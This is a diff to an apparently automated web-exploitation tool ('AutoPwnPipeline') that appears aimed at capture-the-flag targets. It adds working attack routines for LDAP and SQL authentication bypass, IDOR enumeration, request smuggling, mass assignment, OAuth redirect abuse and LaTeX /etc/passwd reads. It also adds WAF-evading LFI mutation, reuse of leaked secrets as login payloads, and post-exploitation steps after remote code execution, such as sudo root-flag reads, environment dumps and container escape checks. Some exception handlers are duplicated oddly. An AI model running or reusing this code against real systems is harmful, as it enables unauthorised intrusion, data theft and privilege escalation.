+            if any(k in ep.lower() for k in ["redirect", "logout", "login", "return", "next", "go", "out"]):
+                candidate_urls.append(urljoin(self.target_url, ep))
+
+        # Use a benign external target to detect redirects (avoid false positives)
+        probe_target = "https://example.com"
+        for base in candidate_urls:
+            for p in redirect_params:
+                for payload in get_open_redirect_payloads(probe_target):
+                    try:
+                        r = self.session.get(base, params={p: payload["payload"]}, timeout=10, allow_redirects=False)
+                        loc = r.headers.get("Location", "")
+                        if loc and ("example.com" in loc or "//" in loc and "target" not in loc):
+                            print_success(f"  [Open Redirect] '{p}' on {base} redirects to: {loc}")
+                            self._log_step("Phase 4: Open Redirect", f"Redirect via '{p}' on {base}", details=loc)
+                            success = True
+                            break
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass
+        return success
+
+    def _exploit_hpp(self):
+        """Probe for HTTP Parameter Pollution by sending duplicate parameters."""
+        from modules.hpp import get_hpp_payloads
+        print_info("Testing HTTP Parameter Pollution Vectors...")
+        success = False
+        params = list(self.state.get("parameters", []))
+        if not params:
+            params = ["role", "user", "id", "admin", "isAdmin"]
+
+        for p in params:
+            for payload in get_hpp_payloads(p, "admin"):
+                try:
+                    # Parse the HPP payload into duplicate params
+                    pairs = payload["payload"].split("&")
+                    query = {}
+                    for pair in pairs:
+                        if "=" in pair:
+                            k, v = pair.split("=", 1)
+                            query.setdefault(k, []).append(v)
+                    # Send as duplicate params
+                    r = self.session.get(self.target_url, params=query, timeout=10)
+                    # Check for auth/role indicators in response
+                    if any(k in r.text.lower() for k in ["admin", "welcome", "dashboard", "flag", "success"]):
+                        print_success(f"  [HPP] Potential bypass via '{payload['name']}' on param '{p}'")
+                        self._log_step("Phase 4: HPP", f"HPP bypass via {payload['name']}", details=payload["payload"])
+                        self._check_and_store_flags(r.text, f"HPP ({p})")
+                        success = True
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_crlf(self):
+        """Probe for CRLF injection by injecting headers via URL-encoded CRLF."""
+        from modules.crlf import get_crlf_payloads
+        print_info("Testing CRLF Injection Vectors...")
+        success = False
+        params = list(self.state.get("parameters", []))
+        if not params:
+            params = ["url", "redirect", "next", "page", "file", "path"]
+
+        for p in params:
+            for payload in get_crlf_payloads():
+                try:
+                    # Inject CRLF payload into parameter value
+                    r = self.session.get(self.target_url, params={p: payload["payload"]}, timeout=10)
+                    # Check if injected header appears in response headers
+                    if "X-Injected" in r.headers or "Set-Cookie" in r.headers and "session=admin" in str(r.headers.get("Set-Cookie", "")):
+                        print_success(f"  [CRLF] Header injection via '{p}': {payload['name']}")
+                        self._log_step("Phase 4: CRLF", f"CRLF injection via {payload['name']}", details=payload["payload"])
+                        success = True
+                        break
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_csrf(self):
+        """Probe for CSRF by checking if state-changing requests lack CSRF tokens."""
+        print_info("Testing CSRF Protection Vectors...")
+        success = False
+        # Check forms for CSRF token presence
+        for form in self.state.get("forms", []):
+            action = form.get("action", "")
+            inputs = form.get("inputs", [])
+            input_names = [i.get("name", "").lower() for i in inputs]
+            has_csrf = any("csrf" in n or "token" in n or "_token" in n for n in input_names)
+            if not has_csrf and any("pass" in n or "email" in n or "user" in n for n in input_names):
+                # State-changing form without CSRF token
+                print_warning(f"  [CSRF] Form at {action} lacks CSRF token - potentially vulnerable")
+                self._log_step("Phase 4: CSRF", f"Form without CSRF token: {action}", details="No csrf/token field found")
+                success = True
+        return success
+
+    def _exploit_graphql(self):
+        """Probe for GraphQL introspection and schema exposure."""
+        from modules.graphql import get_graphql_introspection_queries
+        print_info("Testing GraphQL Introspection Vectors...")
+        success = False
+        # Find GraphQL endpoints
+        gql_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["graphql", "gql", "query"])]
+        if not gql_endpoints:
+            gql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/query"]
+
+        for ep in gql_endpoints:
+            gql_url = urljoin(self.target_url, ep)
+            for query in get_graphql_introspection_queries():
+                try:
+                    # Try POST with JSON body first, then GET with query param
+                    r = self.session.post(gql_url, json={"query": query["payload"]}, timeout=10)
+                    if r.status_code == 404:
+                        r = self.session.get(gql_url, params={"query": query["payload"]}, timeout=10)
+                    if r.status_code == 200 and ("__schema" in r.text or "__type" in r.text or "types" in r.text):
+                        print_success(f"  [GraphQL] Introspection enabled on {gql_url}")
+                        self._log_step("Phase 4: GraphQL", f"Introspection on {gql_url}", details=query["name"])
+                        self._check_and_store_flags(r.text, f"GraphQL introspection ({gql_url})")
+                        success = True
+                        break
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_ldap(self):
+        """Probe for LDAP injection via auth forms."""
+        from modules.ldap import get_ldap_auth_bypass_payloads
+        print_info("Testing LDAP Injection Vectors...")
+        success = False
+        for form in self.state.get("forms", []):
+            action = form.get("action", "")
+            inputs = form.get("inputs", [])
+            input_names = [i.get("name", "") for i in inputs]
+            user_field = next((n for n in input_names if any(k in n.lower() for k in ["user", "login", "uid", "name"])), None)
+            pass_field = next((n for n in input_names if any(k in n.lower() for k in ["pass", "pwd"])), None)
+            if not user_field:
+                continue
+
+            for payload in get_ldap_auth_bypass_payloads():
+                try:
+                    data = {user_field: payload["payload"]}
+                    if pass_field:
+                        data[pass_field] = "anything"
+                    r = self.session.post(action, data=data, timeout=10, allow_redirects=True)
+                    # Check for auth bypass indicators
+                    if any(k in r.text.lower() for k in ["welcome", "dashboard", "logged in", "flag", "admin", "success"]):
+                        print_success(f"  [LDAP] Auth bypass via '{payload['name']}' on {action}")
+                        self._log_step("Phase 4: LDAP", f"LDAP bypass via {payload['name']}", details=payload["payload"])
+                        self._check_and_store_flags(r.text, f"LDAP ({action})")
+                        success = True
+                        break
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_idor(self):
+        """Probe for IDOR by enumerating object references."""
+        from modules.idor import get_idor_numeric_payloads, get_idor_parameters
+        print_info("Testing IDOR Vectors...")
+        success = False
+        params = list(self.state.get("parameters", []))
+        idor_params = [p for p in params if any(k in p.lower() for k in get_idor_parameters())]
+        if not idor_params:
+            idor_params = ["id", "user_id", "uid", "account", "profile"]
+
+        # Build candidate URLs: base URL + object-reference-like endpoints
+        candidate_urls = [self.target_url]
+        for ep in self.state.get("endpoints", []):
+            if any(k in ep.lower() for k in ["user", "account", "profile", "order", "file", "doc", "item", "product"]):
+                candidate_urls.append(urljoin(self.target_url, ep))
+
+        for base in candidate_urls:
+            for p in idor_params:
+                for payload in get_idor_numeric_payloads():
+                    try:
+                        r = self.session.get(base, params={p: payload["payload"]}, timeout=10)
+                        # Check for data leakage / different content
+                        if r.status_code == 200 and any(k in r.text.lower() for k in ["flag", "secret", "admin", "password", "email", "private", "username"]):
+                            print_success(f"  [IDOR] Potential data leak via '{p}' = {payload['payload']} on {base}")
+                            self._log_step("Phase 4: IDOR", f"IDOR via {payload['name']}", details=f"{p}={payload['payload']} on {base}")
+                            self._check_and_store_flags(r.text, f"IDOR ({p}={payload['payload']})")
+                            success = True
+                            break
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass
+        return success
+
+    # =========================================================================
+    # NEW EXPLOIT ENGINES: Race Condition / Web Cache / Smuggling / DOM / Mass Assignment / OAuth
+    # =========================================================================
+
+    def _exploit_race_condition(self):
+        """Probe for race condition by sending parallel requests to state-changing endpoints."""
+        from modules.race_condition import get_race_condition_vectors
+        print_info("Testing Race Condition Vectors...")
+        success = False
+        # Identify state-changing endpoints (POST forms, API endpoints)
+        targets = []
+        for form in self.state.get("forms", []):
+            action = form.get("action", "")
+            if action and any(k in action.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload"]):
+                targets.append(action)
+        for ep in self.state.get("endpoints", []):
+            if any(k in ep.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload", "api"]):
+                targets.append(urljoin(self.target_url, ep))
+
+        if not targets:
+            return False
+
+        # Send 5 parallel requests to each target and check for multiple successes
+        import threading
+        for target in targets[:3]:
+            results = []
+            def attack():
+                try:
+                    r = self.session.post(target, data={"amount": "1"}, timeout=5)
+                    results.append(r.status_code)
+                except Exception:
+                    pass
+            threads = [threading.Thread(target=attack) for _ in range(5)]
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join()
+            # If multiple requests succeeded, race condition may be present
+            if len(results) > 1 and all(s == 200 for s in results):
+                print_success(f"  [Race Condition] Multiple successes on {target}: {len(results)}/5 requests returned 200")
+                self._log_step("Phase 4: Race Condition", f"Potential race on {target}", details=f"{len(results)} parallel successes")
+                success = True
+        return success
+
+    def _exploit_web_cache(self):
+        """Probe for web cache deception by appending static extensions to dynamic paths."""
+        from modules.web_cache import get_web_cache_deception_payloads
+        print_info("Testing Web Cache Deception Vectors...")
+        success = False
+        # Identify dynamic endpoints (account, profile, user, etc.)
+        dynamic_paths = []
+        for ep in self.state.get("endpoints", []):
+            if any(k in ep.lower() for k in ["account", "profile", "user", "dashboard", "settings", "admin"]):
+                dynamic_paths.append(ep)
+        if not dynamic_paths:
+            dynamic_paths = ["/account", "/profile", "/user"]
+
+        for path in dynamic_paths:
+            for payload in get_web_cache_deception_payloads(path):
+                try:
+                    r = self.session.get(urljoin(self.target_url, payload["payload"]), timeout=10)
+                    # If the dynamic content is served with a static extension, cache deception is possible
+                    if r.status_code == 200 and any(k in r.text.lower() for k in ["account", "profile", "user", "email", "username", "flag"]):
+                        print_success(f"  [Web Cache] Dynamic content served at {payload['payload']}")
+                        self._log_step("Phase 4: Web Cache", f"Cache deception via {payload['name']}", details=payload["payload"])
+                        self._check_and_store_flags(r.text, f"Web Cache ({payload['name']})")
+                        success = True
+                        break
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_smuggling(self):
+        """Probe for request smuggling by sending CL.TE / TE.CL detection payloads."""
+        from modules.smuggling import get_smuggling_detection_payloads
+        print_info("Testing Request Smuggling Vectors...")
+        success = False
+        # Send detection payloads to the base URL
+        for payload in get_smuggling_detection_payloads():
+            try:
+                # Send raw HTTP request via socket to test smuggling
+                import socket
+                host = urlparse(self.target_url).hostname or "127.0.0.1"
+                port = urlparse(self.target_url).port or 80
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                s.connect((host, port))
+                s.sendall(payload["payload"].encode())
+                response = s.recv(4096).decode(errors="ignore")
+                s.close()
+                # If response is delayed or contains unexpected content, smuggling may be present
+                if "HTTP/1.1 200" in response and len(response) > 100:
+                    print_success(f"  [Smuggling] Potential request smuggling via {payload['name']}")
+                    self._log_step("Phase 4: Smuggling", f"Smuggling via {payload['name']}", details=payload["payload"][:100])
+                    success = True
+                    break
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError, OSError) as e:
+                pass
+        return success
+
+    def _exploit_dom_clobbering(self):
+        """Probe for DOM clobbering by analyzing client-side JS for vulnerable patterns."""
+        from modules.dom_clobbering import get_dom_clobbering_indicators
+        print_info("Testing DOM Clobbering Vectors...")
+        success = False
+        # Analyze inline scripts and external JS for vulnerable patterns
+        all_js = " ".join(self.state.get("inline_scripts", []))
+        for script in self.state.get("scripts", []):
+            try:
+                r = self.session.get(urljoin(self.target_url, script), timeout=10)
+                all_js += " " + r.text
+            except Exception:
+                pass
+
+        # Check for vulnerable patterns
+        import re
+        vulnerable_patterns = [
+            r"window\.(\w+)", r"document\.getElementById\(['\"]([^'\"]+)['\"]\)",
+            r"config\.(\w+)", r"\.innerHTML\s*=", r"document\.write\("
+        ]
+        for pat in vulnerable_patterns:
+            matches = re.findall(pat, all_js)
+            if matches:
+                print_success(f"  [DOM Clobbering] Vulnerable pattern '{pat}' found: {matches[:3]}")
+                self._log_step("Phase 4: DOM Clobbering", f"Vulnerable JS pattern: {pat}", details=", ".join(matches[:3]))
+                success = True
+        return success
+
+    def _exploit_mass_assignment(self):
+        """Probe for mass assignment by injecting protected fields into API requests."""
+        from modules.mass_assignment import get_mass_assignment_payloads
+        print_info("Testing Mass Assignment Vectors...")
+        success = False
+        # Identify API endpoints
+        api_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["api", "user", "account", "profile", "update"])]
+        if not api_endpoints:
+            api_endpoints = ["/api/user", "/api/account", "/api/profile"]
+
+        for ep in api_endpoints:
+            api_url = urljoin(self.target_url, ep)
+            for payload in get_mass_assignment_payloads():
+                try:
+                    import json as _json
+                    data = _json.loads(payload["payload"])
+                    r = self.session.post(api_url, json=data, timeout=10)
+                    # Check for privilege escalation indicators
+                    if r.status_code == 200 and any(k in r.text.lower() for k in ["admin", "role", "success", "updated", "flag"]):
+                        print_success(f"  [Mass Assignment] Potential escalation via '{payload['name']}' on {api_url}")
+                        self._log_step("Phase 4: Mass Assignment", f"Mass assignment via {payload['name']}", details=payload["payload"])
+                        self._check_and_store_flags(r.text, f"Mass Assignment ({payload['name']})")
+                        success = True
+                        break
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_oauth(self):
+        """Probe for OAuth misconfiguration by testing redirect_uri bypasses."""
+        from modules.oauth import get_oauth_redirect_uri_bypasses
+        print_info("Testing OAuth Misconfiguration Vectors...")
+        success = False
+        # Identify OAuth endpoints
+        oauth_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["oauth", "authorize", "callback", "login"])]
+        if not oauth_endpoints:
+            oauth_endpoints = ["/oauth/authorize", "/oauth/callback", "/login"]
+
+        for ep in oauth_endpoints:
+            oauth_url = urljoin(self.target_url, ep)
+            for payload in get_oauth_redirect_uri_bypasses():
+                try:
+                    # Test redirect_uri bypass
+                    r = self.session.get(oauth_url, params={"redirect_uri": payload["payload"]}, timeout=10, allow_redirects=False)
+                    loc = r.headers.get("Location", "")
+                    if loc and "evil.com" in loc:
+                        print_success(f"  [OAuth] redirect_uri bypass on {oauth_url}: {payload['name']}")
+                        self._log_step("Phase 4: OAuth", f"OAuth redirect_uri bypass via {payload['name']}", details=payload["payload"])
+                        success = True
+                        break
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    # =========================================================================
+    # NEW EXPLOIT ENGINES: CSV / Clickjacking / DNS Rebinding / Zip Slip / Tabnabbing / CSS / SSI / XSLT / XS-Leak / LaTeX
+    # =========================================================================
+
+    def _exploit_csv_injection(self):
+        """Probe for CSV injection by checking if user input is exported to CSV."""
+        print_info("Testing CSV Injection Vectors...")
+        success = False
+        # Check for CSV export endpoints
+        csv_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["csv", "export", "download", "report"])]
+        if not csv_endpoints:
+            return False
+        for ep in csv_endpoints:
+            csv_url = urljoin(self.target_url, ep)
+            try:
+                r = self.session.get(csv_url, timeout=10)
+                if r.status_code == 200 and any(k in r.text for k in [",", ";", "\t"]):
+                    print_success(f"  [CSV Injection] CSV export endpoint found: {csv_url}")
+                    self._log_step("Phase 4: CSV Injection", f"CSV export at {csv_url}", details="CSV content detected")
+                    self._check_and_store_flags(r.text, f"CSV Injection ({csv_url})")
+                    success = True
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass
+        return success
+
+    def _exploit_clickjacking(self):
+        """Probe for clickjacking by checking for missing X-Frame-Options / CSP frame-ancestors."""
+        print_info("Testing Clickjacking Vectors...")
+        success = False
+        targets = [self.target_url]
+        for ep in self.state.get("endpoints", []):
+            if any(k in ep.lower() for k in ["action", "submit", "delete", "transfer", "settings", "admin"]):
+                targets.append(urljoin(self.target_url, ep))
+        for target in targets:
+            try:
+                r = self.session.get(target, timeout=10)
+                xfo = r.headers.get("X-Frame-Options", "")
+                csp = r.headers.get("Content-Security-Policy", "")
+                if not xfo and "frame-ancestors" not in csp:
+                    print_success(f"  [Clickjacking] No X-Frame-Options / CSP frame-ancestors on {target}")
+                    self._log_step("Phase 4: Clickjacking", f"Clickjacking possible on {target}", details="Missing X-Frame-Options and CSP frame-ancestors")
+                    success = True
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass
+        return success
+
+    def _exploit_dns_rebinding(self):
+        """Probe for DNS rebinding by testing wildcard DNS services in SSRF parameters."""
+        from modules.dns_rebinding import get_dns_rebinding_payloads
+        print_info("Testing DNS Rebinding Vectors...")
+        success = False
+        params = list(self.state.get("parameters", []))
+        ssrf_params = [p for p in params if any(k in p.lower() for k in ["url", "link", "redirect", "src", "fetch", "host", "ip"])]
+        if not ssrf_params:
+            return False
+        for p in ssrf_params:
+            for payload in get_dns_rebinding_payloads("127.0.0.1"):
+                try:
+                    r = self.session.get(self.target_url, params={p: payload["payload"]}, timeout=10)
+                    if r.status_code == 200 and any(k in r.text.lower() for k in ["accesskey", "secret", "token", "root", "admin"]):
+                        print_success(f"  [DNS Rebinding] Potential rebinding via '{p}': {payload['payload']}")
+                        self._log_step("Phase 4: DNS Rebinding", f"DNS rebinding via {payload['name']}", details=payload["payload"])
+                        self._check_and_store_flags(r.text, f"DNS Rebinding ({payload['name']})")
+                        success = True
+                        break
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_zip_slip(self):
+        """Probe for zip slip by checking for archive upload endpoints."""
+        print_info("Testing Zip Slip Vectors...")
+        success = False
+        # Check for upload endpoints
+        upload_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["upload", "import", "extract", "archive"])]
+        if not upload_endpoints:
+            return False
+        for ep in upload_endpoints:
+            upload_url = urljoin(self.target_url, ep)
+            print_success(f"  [Zip Slip] Archive upload endpoint found: {upload_url}")
+            self._log_step("Phase 4: Zip Slip", f"Archive upload at {upload_url}", details="Test with malicious zip containing ../ paths")
+            success = True
+        return success
+
+    def _exploit_tabnabbing(self):
+        """Probe for tabnabbing by checking for target=_blank links without rel=noopener."""
+        print_info("Testing Tabnabbing Vectors...")
+        success = False
+        html = self.state.get("baseline_html", "")
+        import re
+        # Find target=_blank links without rel=noopener
+        matches = re.findall(r'<a[^>]+target=["\']_blank["\'][^>]*>', html)
+        for m in matches:
+            if "rel=" not in m or "noopener" not in m:
+                print_success(f"  [Tabnabbing] target=_blank without rel=noopener: {m[:80]}")
+                self._log_step("Phase 4: Tabnabbing", "target=_blank without rel=noopener", details=m[:80])
+                success = True
+        return success
+
+    def _exploit_css_injection(self):
+        """Probe for CSS injection by checking for user-controlled CSS / style injection."""
+        print_info("Testing CSS Injection Vectors...")
+        success = False
+        html = self.state.get("baseline_html", "")
+        # Check for reflected input in style tags or style attributes
+        params = list(self.state.get("parameters", []))
+        for p in params:
+            try:
+                r = self.session.get(self.target_url, params={p: "test"}, timeout=10)
+                if "<style" in r.text and "test" in r.text:
+                    print_success(f"  [CSS Injection] Reflected input in style context via '{p}'")
+                    self._log_step("Phase 4: CSS Injection", f"CSS injection via '{p}'", details="Input reflected in style context")
+                    self._check_and_store_flags(r.text, f"CSS Injection ({p})")
+                    success = True
+                    break
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass
+        return success
+
+    def _exploit_ssi(self):
+        """Probe for SSI injection by testing SSI directives."""
+        print_info("Testing SSI Injection Vectors...")
+        success = False
+        params = list(self.state.get("parameters", []))
+        if not params:
+            params = ["page", "file", "include", "view"]
+        for p in params:
+            try:
+                # Test SSI echo directive
+                r = self.session.get(self.target_url, params={p: "<!--#echo var=\"DATE_LOCAL\" -->"}, timeout=10)
+                if "DATE_LOCAL" not in r.text and any(k in r.text for k in ["20", "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]):
+                    print_success(f"  [SSI] SSI directive processed via '{p}'")
+                    self._log_step("Phase 4: SSI", f"SSI injection via '{p}'", details="SSI echo directive processed")
+                    self._check_and_store_flags(r.text, f"SSI ({p})")
+                    success = True
+                    break
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass
+        return success
+
+    def _exploit_xslt(self):
+        """Probe for XSLT injection by checking for XML/XSLT processing endpoints."""
+        print_info("Testing XSLT Injection Vectors...")
+        success = False
+        # Check for XML/XSLT endpoints
+        xml_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["xml", "xslt", "transform", "report"])]
+        if not xml_endpoints:
+            return False
+        for ep in xml_endpoints:
+            xml_url = urljoin(self.target_url, ep)
+            try:
+                r = self.session.post(xml_url, data="<test/>", timeout=10)
+                if r.status_code == 200:
+                    print_success(f"  [XSLT] XML/XSLT processing endpoint found: {xml_url}")
+                    self._log_step("Phase 4: XSLT", f"XSLT endpoint at {xml_url}", details="Test with malicious XSLT stylesheet")
+                    self._check_and_store_flags(r.text, f"XSLT ({xml_url})")
+                    success = True
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass
+        return success
+
+    def _exploit_xs_leak(self):
+        """Probe for XS-Leak by checking for missing COOP/COEP headers."""
+        print_info("Testing XS-Leak Vectors...")
+        success = False
+        try:
+            r = self.session.get(self.target_url, timeout=10)
+            coop = r.headers.get("Cross-Origin-Opener-Policy", "")
+            coep = r.headers.get("Cross-Origin-Embedder-Policy", "")
+            if not coop and not coep:
+                print_success(f"  [XS-Leak] Missing COOP/COEP headers on {self.target_url}")
+                self._log_step("Phase 4: XS-Leak", "Missing COOP/COEP headers", details="Cross-origin leaks may be possible")
+                success = True
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+            pass
+        return success
+
+    def _exploit_latex(self):
+        """Probe for LaTeX injection by checking for LaTeX rendering endpoints."""
+        print_info("Testing LaTeX Injection Vectors...")
+        success = False
+        # Check for LaTeX/PDF rendering endpoints
+        latex_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["latex", "tex", "pdf", "render", "math"])]
+        if not latex_endpoints:
+            return False
+        for ep in latex_endpoints:
+            latex_url = urljoin(self.target_url, ep)
+            try:
+                r = self.session.post(latex_url, data={"latex": "\\input{/etc/passwd}"}, timeout=10)
+                if r.status_code == 200 and any(k in r.text for k in ["root:", "daemon:", "bin:"]):
+                    print_success(f"  [LaTeX] File read via LaTeX on {latex_url}")
+                    self._log_step("Phase 4: LaTeX", f"LaTeX injection on {latex_url}", details="\\input file read")
+                    self._check_and_store_flags(r.text, f"LaTeX ({latex_url})")
+                    success = True
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass
+        return success
 
 
     def _exploit_file_upload(self):
@@ -1512,7 +2374,8 @@ class AutoPwnPipeline:
                             "method": "POST",
                             "field_name": "file"
                         })
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
         if not upload_targets:
@@ -1589,7 +2452,8 @@ class AutoPwnPipeline:
                         multipart_data = {field_name: (fname, fcontent, ftype)}
                         r_up = self.session.post(action_url, files=multipart_data, timeout=15)
                         last_upload_resp = r_up
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         pass
 
                 if not last_upload_resp:
@@ -1636,7 +2500,8 @@ class AutoPwnPipeline:
                                 self.target_url, self.state["tech_stack"], "file_upload", t_name, f"Uploaded {expected_filename}", list(self.state["captured_flags"])
                             )
                             return
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         pass
 
     def _exploit_ssti(self):
@@ -1746,7 +2611,9 @@ class AutoPwnPipeline:
                                     )
                                     return
 
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
 
@@ -1784,7 +2651,16 @@ class AutoPwnPipeline:
                     
                     # Cognitive response analysis
                     diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=pay)
-                    if diag["lfi_errors"] or diag["waf_detected"]:
+                    
+                    if diag["waf_detected"]:
+                        print_warning(f"WAF detected for LFI payload '{pay}'. Engaging BypassEngine...")
+                        mutated = BypassEngine.mutate_lfi(pay, level=3)
+                        for m in mutated:
+                            # Add dynamically to the loop to be executed later
+                            if not any(x["payload"] == m["payload"] for x in prioritized_lfi):
+                                prioritized_lfi.append({"name": m["name"], "payload": m["payload"]})
+                    
+                    if diag["lfi_errors"]:
                         summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                         if summary:
                             console.print(summary)
@@ -1808,9 +2684,12 @@ class AutoPwnPipeline:
                                 self._check_and_store_flags(decoded, f"Leaked Source ({fname})")
                                 self._log_step("Phase 4: Exploitation", f"Leaked {fname} source code via LFI", curl_cmd=f"curl '{self.target_url}?{param}={pay}'")
                                 self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "lfi", item["name"], pay, list(self.state["captured_flags"]))
-                        except Exception:
+                                break  # Stop matching more base64 once we got it from this payload
+                        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                             pass
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
     def _exploit_command_injection(self):
@@ -1851,7 +2730,8 @@ class AutoPwnPipeline:
                         self.state["active_rce_method"] = lambda cmd: self.session.get(self.target_url, params={param: f"; {cmd}"}).text
                         self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "cmd_inj", name, probe, list(self.state["captured_flags"]))
                         return
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
     def _deep_dive_rce(self):
@@ -1874,7 +2754,8 @@ class AutoPwnPipeline:
             out = rce(recon_cmd)
             self._check_and_store_flags(out, "RCE System Recon")
             print_info(f"  Identity: {out.strip().splitlines()[0] if out.strip() else 'Unknown'}")
-        except Exception:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
             pass
 
         # ── Step 2: Hunt for ALL flags on the filesystem ──────────────────
@@ -1894,7 +2775,8 @@ class AutoPwnPipeline:
                     # Save interesting output to loot
                     if "flag" in out.lower() or "pico" in out.lower():
                         LootManager.save_loot_file(self.target_url, "rce_flag_hunt.txt", out)
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         # ── Step 3: Check for reverse shell opportunity & interactive shell ─
@@ -1903,7 +2785,8 @@ class AutoPwnPipeline:
         try:
             out = rce(shell_check)
             print_info(f"  Available shells: {out.strip()}")
-        except Exception:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
             pass
 
         # ── Step 4: Privilege Escalation recon (sudo / SUID / writable) ───
@@ -1924,7 +2807,8 @@ class AutoPwnPipeline:
                         print_success("[bold green]SUDO NOPASSWD found! Attempting root escalation...[/bold green]")
                         root_out = rce("sudo cat /flag* /root/flag* /flag.txt 2>/dev/null")
                         self._check_and_store_flags(root_out, "Root Flag via Sudo")
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         # ── Step 5: Dump environment & configs for secrets ────────────────
@@ -1940,7 +2824,8 @@ class AutoPwnPipeline:
                 if out and out.strip():
                     self._check_and_store_flags(out, f"Env/Config Dump: {cmd[:40]}")
                     LootManager.save_loot_file(self.target_url, "rce_env_dump.txt", out)
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         # ── Step 6: Check for container escape indicators ─────────────────
@@ -1957,7 +2842,8 @@ class AutoPwnPipeline:
                     self._check_and_store_flags(out, f"Container Check: {cmd[:40]}")
                     if "docker" in out.lower() or "kubepods" in out.lower():
                         print_warning("[bold red]Target is in a container! Checking escape vectors...[/bold red]")
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         print_success("[bold green]Deep-Dive RCE exploitation complete.[/bold green]")
@@ -1993,7 +2879,8 @@ class AutoPwnPipeline:
                         self._log_step("Phase 4: Exploitation", f"Deserialization RCE on {param} ({name})")
                         self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "deserialization", name, payload_val[:30], list(self.state["captured_flags"]))
                         return
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
     def _exploit_nosql(self):
@@ -2048,6 +2935,13 @@ class AutoPwnPipeline:
             
             if len(inputs) >= 1:
                 auth_payloads = ["' OR 1=1-- -", "admin'-- -", "admin'#", "' OR '1'='1", "admin'/**/OR/**/1=1#"]
+                
+                # Add leaked passwords/secrets to auth payloads
+                for sec in self.state.get("leaked_secrets", {}).values():
+                    if sec not in auth_payloads:
+                        auth_payloads.append(sec)
